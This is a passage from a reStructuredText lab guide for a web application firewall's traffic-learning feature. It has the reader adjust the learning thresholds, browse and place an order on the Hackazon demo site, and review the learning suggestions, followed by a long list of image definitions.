|image89|

1. Review Policy >> Server Technologies page

|image90|

1. |image91|\ Go to Learning and Blocking Settings page

   a. Change Loosen Policy settings

      -  Untrusted Sources: 1

      -  Hours: 0.1

      -  Days: 0.1

      -  Trusted Sources: 1

      -  Days: 0.1

   b. Click Save and Apply Policy

    | NOTE: We are only doing this to lower the time that it will take
      to **show** new Learning Suggestions for the purposes of the lab.
    | ***DO NOT do this in a production environment.***

Step 2: Review Learning Suggestions
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. Return to the Hackazon browser window

   a. Click on the Hackazon logo to return to the home page

   b. Click the Sign In/Sign Up link in the top left corner

   c. Login as user1/user1

    |image92|

a. On the My Account page click on one of the existing orders

|image93|

a. Review the order then click on the Orders link to return to the
   Orders page.

|image94|

i.   Click the Hackazon logo to return to the home page

ii.  Click on any item on the home page and click Add to Cart

iii. Browse to your cart

iv.  On the Overview screen click Next

v.   On the Shipping screen, fill out the shipping information and click
     Next

vi.  On the Billing screen, click Bill to this Address

vii. On the Confirmation screen, click Place Order

|image95|

1. Return to the ASM WebUI and navigate to the Traffic Learning page.
   Review various Learning suggestion types

|image96|

.. |image0| image:: media/image1.png
   :width: 1.93667in
   :height: 0.61667in
.. |image1| image:: media/image3.png
   :width: 6.50000in
   :height: 2.88472in
.. |image2| image:: media/image4.png
   :width: 3.44722in
   :height: 1.79506in
.. |image3| image:: media/image5.png
   :width: 6.92003in
   :height: 1.83056in
.. |image4| image:: media/image7.png
   :width: 3.86111in
   :height: 2.07906in
.. |image5| image:: media/image8.png
   :width: 7.09919in
   :height: 1.82562in
.. |image6| image:: media/image9.png
   :width: 6.50000in
   :height: 2.88958in
.. |image7| image:: media/image10.png
   :width: 6.50000in
   :height: 2.90347in
.. |image8| image:: media/image11.png
   :width: 6.50000in
   :height: 2.90833in
.. |image9| image:: media/image12.png
   :width: 3.56482in
   :height: 2.46551in
.. |image10| image:: media/image13.png
   :width: 2.93518in
   :height: 1.68941in
.. |image11| image:: media/image14.png
   :width: 6.50000in
   :height: 1.24583in
.. |image12| image:: media/image15.png
   :width: 4.36449in
   :height: 0.58333in
.. |image13| image:: media/image16.png
   :width: 5.40208in
   :height: 1.47557in
.. |image14| image:: media/image17.png
   :width: 5.16736in
   :height: 2.00800in
.. |image15| image:: media/image18.png
   :width: 4.58403in
   :height: 2.43876in
.. |image16| image:: media/image19.png
   :width: 2.81720in
   :height: 3.62778in
.. |image17| image:: media/image20.png
   :width: 4.66736in
   :height: 2.48494in
.. |image18| image:: media/image21.png
   :width: 1.91736in
   :height: 2.74930in
.. |image19| image:: media/image22.png
   :width: 1.99931in
   :height: 0.91045in
.. |image20| image:: media/image23.png
   :width: 5.58403in
   :height: 2.98838in
.. |image21| image:: media/image24.png
   :width: 5.50556in
   :height: 2.89806in
.. |image22| image:: media/image25.png
   :width: 5.27500in
   :height: 2.80995in
.. |image23| image:: media/image26.png
   :width: 6.50000in
   :height: 2.91875in
.. |image24| image:: media/image27.png
   :width: 2.83403in
   :height: 2.12831in
.. |image25| image:: media/image28.png
   :width: 4.83403in
   :height: 2.59313in
.. |image26| image:: media/image29.png
   :width: 5.60133in
   :height: 2.70671in
.. |image27| image:: media/image30.png
   :width: 3.93510in
   :height: 4.16647in
.. |image28| image:: media/image31.png
   :width: 4.49604in
   :height: 3.72963in
.. |image29| image:: media/image32.png
   :width: 5.65208in
   :height: 2.60729in
.. |image30| image:: media/image33.png
   :width: 4.38689in
   :height: 3.58669in
.. |image31| image:: media/image34.png
   :width: 4.52384in
   :height: 2.82615in
.. |image32| image:: media/image35.png
   :width: 4.40903in
   :height: 2.76667in
.. |image33| image:: media/image16.png
   :width: 5.40208in
   :height: 1.47557in
.. |image34| image:: media/image36.png
   :width: 5.56875in
   :height: 3.71559in
.. |image35| image:: media/image37.png
   :width: 5.90208in
   :height: 2.08595in
.. |image36| image:: media/image38.png
   :width: 5.96909in
   :height: 2.32739in
.. |image37| image:: media/image39.png
   :width: 5.98542in
   :height: 2.59978in
.. |image38| image:: media/image40.png
   :width: 7.06875in
   :height: 3.00684in
.. |image39| image:: media/image41.png
   :width: 5.76458in
   :height: 3.61728in
.. |image40| image:: media/image42.png
   :width: 6.98542in
   :height: 4.27598in
.. |image41| image:: media/image43.png
   :width: 4.04254in
   :height: 2.47893in
.. |image42| image:: media/image44.png
   :width: 4.00786in
   :height: 2.45139in
.. |image43| image:: media/image45.png
   :width: 5.52500in
   :height: 3.52219in
.. |image44| image:: media/image46.png
   :width: 4.09653in
   :height: 1.66006in
.. |image45| image:: media/image47.png
   :width: 6.50000in
   :height: 3.48958in
.. |image46| image:: media/image48.png
   :width: 6.50000in
   :height: 3.36250in
.. |image47| image:: media/image49.png
   :width: 6.50000in
   :height: 3.02083in
.. |image48| image:: media/image50.png
   :width: 6.50000in
   :height: 3.32639in
.. |image49| image:: media/image51.png
   :width: 6.50763in
   :height: 4.14375in
.. |image50| image:: media/image52.png
   :width: 6.50000in
   :height: 1.93056in
.. |image51| image:: media/image53.png
   :width: 4.59653in
   :height: 2.77314in
.. |image52| image:: media/image54.png
   :width: 5.63542in
   :height: 4.51074in
.. |image53| image:: media/image55.png
   :width: 5.24583in
   :height: 3.81668in
.. |image54| image:: media/image56.png
   :width: 6.50000in
   :height: 4.30417in
.. |image55| image:: media/image57.png
   :width: 6.50000in
   :height: 4.09236in
.. |image56| image:: media/image58.png
   :width: 3.68750in
   :height: 3.87581in
.. |image57| image:: media/image59.png
   :width: 6.50000in
   :height: 4.10069in
.. |image58| image:: media/image60.png
   :width: 6.50000in
   :height: 3.28750in
.. |image59| image:: media/image61.png
   :width: 5.24583in
   :height: 1.45718in
.. |image60| image:: media/image62.png
   :width: 5.23885in
   :height: 3.31458in
.. |image61| image:: media/image63.png
   :width: 6.28472in
   :height: 3.84335in
.. |image62| image:: media/image64.png
   :width: 3.03819in
   :height: 2.01345in
.. |image63| image:: media/image65.png
   :width: 6.50000in
   :height: 4.11736in
.. |image64| image:: media/image66.png
   :width: 5.96736in
   :height: 3.25000in
.. |image65| image:: media/image67.png
   :width: 6.50000in
   :height: 2.51852in
.. |image66| image:: media/image68.png
   :width: 6.50000in
   :height: 3.31806in
.. |image67| image:: media/image69.png
   :width: 4.35625in
   :height: 4.17334in
.. |image68| image:: media/image70.png
   :width: 4.35625in
   :height: 3.96806in
.. |image69| image:: media/image71.png
   :width: 2.98485in
   :height: 1.90093in
.. |image70| image:: media/image72.png
   :width: 3.28354in
   :height: 1.88102in
.. |image71| image:: media/image73.png
   :width: 0.28697in
   :height: 0.42837in
.. |image72| image:: media/image74.png
   :width: 6.50000in
   :height: 4.13403in
.. |image73| image:: media/image75.png
   :width: 2.53819in
   :height: 3.37083in
.. |image74| image:: media/image76.png
   :width: 5.65486in
   :height: 3.09265in
.. |image75| image:: media/image77.png
   :width: 3.05764in
   :height: 2.78819in
.. |image76| image:: media/image75.png
   :width: 1.95278in
   :height: 2.59375in
.. |image77| image:: media/image78.png
   :width: 5.91458in
   :height: 2.90737in
.. |image78| image:: media/image79.png
   :width: 5.78472in
   :height: 3.17109in
.. |image79| image:: media/image80.png
   :width: 4.18125in
   :height: 3.72153in
.. |image80| image:: media/image81.png
   :width: 2.76458in
   :height: 2.28846in
.. |image81| image:: media/image82.png
   :width: 2.68125in
   :height: 1.90489in
.. |image82| image:: media/image83.png
   :width: 7.05000in
   :height: 3.44210in
.. |image83| image:: media/image84.png
   :width: 5.01458in
   :height: 3.73354in
.. |image84| image:: media/image85.png
   :width: 5.26458in
   :height: 2.72442in
.. |image85| image:: media/image86.png
   :width: 2.93125in
   :height: 0.92315in
.. |image86| image:: media/image87.png
   :width: 4.68125in
   :height: 2.46719in
.. |image87| image:: media/image88.png
   :width: 4.34792in
   :height: 2.86117in
.. |image88| image:: media/image89.png
   :width: 6.76623in
   :height: 2.25974in
.. |image89| image:: media/image90.png
   :width: 3.59792in
   :height: 2.54487in
.. |image90| image:: media/image91.png
   :width: 4.09792in
   :height: 2.07362in
.. |image91| image:: media/image92.png
   :width: 2.02487in
   :height: 2.22963in
.. |image92| image:: media/image93.png
   :width: 2.22399in
   :height: 1.66482in
.. |image93| image:: media/image94.png
   :width: 5.43125in
   :height: 1.77320in
.. |image94| image:: media/image95.png
   :width: 2.34792in
   :height: 2.28048in
.. |image95| image:: media/image96.png
   :width: 4.01458in
   :height: 2.69014in
.. |image96| image:: media/image97.png
   :width: 13.94805in
   :height: 3.03896in
